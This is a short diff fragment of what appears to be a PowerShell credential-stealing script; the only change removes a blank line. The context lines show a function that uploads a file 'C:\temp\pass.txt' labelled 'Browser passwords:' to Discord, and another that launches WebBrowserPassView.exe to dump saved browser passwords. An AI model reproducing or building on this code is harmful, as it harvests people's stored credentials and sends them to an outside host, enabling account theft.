@@ -47,7 +47,6 @@ function Upload{
 Upload-Discord -file "C:\temp\pass.txt" -text "Browser passwords:"
 }
 
-
 function Open{
 .\WebBrowserPassView.exe
 }
